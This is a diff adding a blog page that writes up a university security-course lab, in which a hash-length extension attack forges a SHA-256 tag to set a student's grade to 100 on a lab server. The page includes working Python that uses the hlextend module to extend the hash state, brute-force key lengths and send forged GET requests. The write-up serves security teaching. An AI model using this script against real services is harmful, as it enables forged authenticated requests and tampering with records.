@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Hash Length Extension Module</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>In this lab, we implement a hash-length extension attack using a module created by
+<a href="https://github.com/stephenbradshaw/hlextend/blob/master/hlextend.py">Stefano Palazzo</a>.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#system-setup" id="markdown-toc-system-setup">System Setup</a></li>
+  <li><a href="#updating-the-hash-function-state" id="markdown-toc-updating-the-hash-function-state">Updating the Hash Function State</a></li>
+  <li><a href="#performing-the-attack" id="markdown-toc-performing-the-attack">Performing the Attack</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="system-setup">System Setup</h2>
+
+<hr />
+
+<p>Our target is a server where only authorized users are supposed to update a student’s grades.
+A legitimate update would be done by sending a <code class="language-plaintext highlighter-rouge">GET</code> request with a query string which looks like</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;url&gt;?tag=82f667c5077f20550477b512f862f3b9bde0adaf73371cb6ff85feabc63cda49&amp;sid=1234567890&amp;mark=100
+</code></pre></div></div>
+
+<p>where <code class="language-plaintext highlighter-rouge">sid</code> is the student id of the student to update and <code class="language-plaintext highlighter-rouge">mark</code> is the value used to set tha grade.
+<code class="language-plaintext highlighter-rouge">tag</code> is a SHA2 HMAC which the server uses to verify the authenticity of the request.
+Here, the webapp assumes only authorized users are able to create the HMAC which corresponds
+to a query which updates a student grade.</p>
+
+<p>In order to see their own grades, students are given the tag which corresponds to their own
+<code class="language-plaintext highlighter-rouge">sid</code> and they can send a query which looks something like</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;url&gt;?tag=72c890741cf747b72a7a55bb07c52d67410fb60396893210dc1388246d33b3f8&amp;sid=1234567890
+</code></pre></div></div>
+
+<p>and only returns the current score. We show an example of how to exploit the hash-length extension
+vulnerability.</p>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="updating-the-hash-function-state">Updating the Hash Function State</h2>
+
+<hr />
+
+<p>Similar to our attacks in the cryptopals challenges which preceded this one, we need to update the
+internal state of the hash function. Instead of doing so manually, we will use the aforementioned
+<code class="language-plaintext highlighter-rouge">hlextend</code> module to help us</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span> <span class="n">parse_qs</span><span class="p">,</span> <span class="n">quote</span>
+<span class="kn">import</span> <span class="nn">http.client</span>
+<span class="kn">import</span> <span class="nn">hlextend</span>
+
+<span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="c1"># parameter url is the attack url you construct
+</span>    <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">prefix_tag</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">parsed</span><span class="p">.</span><span class="n">query</span><span class="p">)[</span><span class="s">'tag'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">prefix_sid</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">parsed</span><span class="p">.</span><span class="n">query</span><span class="p">)[</span><span class="s">'sid'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">extend</span> <span class="o">=</span> <span class="s">'&amp;sid='</span> <span class="o">+</span> <span class="n">prefix_sid</span> <span class="o">+</span> <span class="s">'&amp;mark=100'</span>
+
+    <span class="n">sha2</span> <span class="o">=</span> <span class="n">hlextend</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'sha256'</span><span class="p">)</span>
+    <span class="n">sha2</span><span class="p">.</span><span class="n">set_state</span><span class="p">(</span><span class="n">prefix_tag</span><span class="p">)</span>
+    <span class="n">sha2</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">extend</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">ret_tag</span> <span class="o">=</span> <span class="n">sha2</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">set_state()</code> sets the internal state to what it would look like after producing the hash and
+<code class="language-plaintext highlighter-rouge">update()</code> updates the internal state to include the string we want to append. We save the
+digest this produces and all that remains is to guess at the length of the original message.</p>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="performing-the-attack">Performing the Attack</h2>
+
+<hr />
+
+<p>Since we do not know the key size, we just brute force a few likely candidates, say, between 8 and 20.
+For each of those, the module computes the sha2 padding for us and we
+<a href="https://docs.python.org/dev/library/urllib.parse.html#urllib.parse.quote">quote</a>
+it so it is a safe URL to send.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">21</span><span class="p">):</span>
+        <span class="n">ret_q</span> <span class="o">=</span> <span class="s">'sid='</span> <span class="o">+</span> <span class="n">prefix_sid</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">sha2</span><span class="p">.</span><span class="n">padding</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="s">"sid="</span> <span class="o">+</span> <span class="n">prefix_sid</span><span class="p">)))</span> <span class="o">+</span> <span class="s">'&amp;sid='</span> <span class="o">+</span> <span class="n">prefix_sid</span> <span class="o">+</span> <span class="s">'&amp;mark=100'</span>
+        <span class="n">q</span> <span class="o">=</span> <span class="s">"tag="</span> <span class="o">+</span> <span class="n">ret_tag</span> <span class="o">+</span> <span class="s">"&amp;"</span> <span class="o">+</span> <span class="n">ret_q</span>
+        <span class="c1"># open a connection to the server
+</span>        <span class="n">httpconn</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">parsed</span><span class="p">.</span><span class="n">hostname</span><span class="p">,</span> <span class="n">parsed</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
+
+        <span class="c1"># issue server-API request
+</span>        <span class="n">httpconn</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/?"</span> <span class="o">+</span> <span class="n">q</span><span class="p">)</span>
+
+        <span class="c1"># httpresp is response object containing a status value and possible message
+</span>        <span class="n">httpresp</span> <span class="o">=</span> <span class="n">httpconn</span><span class="p">.</span><span class="n">getresponse</span><span class="p">()</span>
+
+        <span class="c1"># valid request will result in httpresp.status value 200
+</span>        <span class="k">if</span> <span class="p">(</span><span class="n">httpresp</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">parsed</span><span class="p">.</span><span class="n">scheme</span> <span class="o">+</span> <span class="s">"://"</span> <span class="o">+</span> <span class="n">parsed</span><span class="p">.</span><span class="n">netloc</span> <span class="o">+</span> <span class="n">parsed</span><span class="p">.</span><span class="n">path</span> <span class="o">+</span> <span class="s">"?"</span> <span class="o">+</span> <span class="n">q</span>
+</code></pre></div></div>
+
+<p>This returns status <code class="language-plaintext highlighter-rouge">200</code> or <code class="language-plaintext highlighter-rouge">OK</code> which tells us our attack succeeded.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
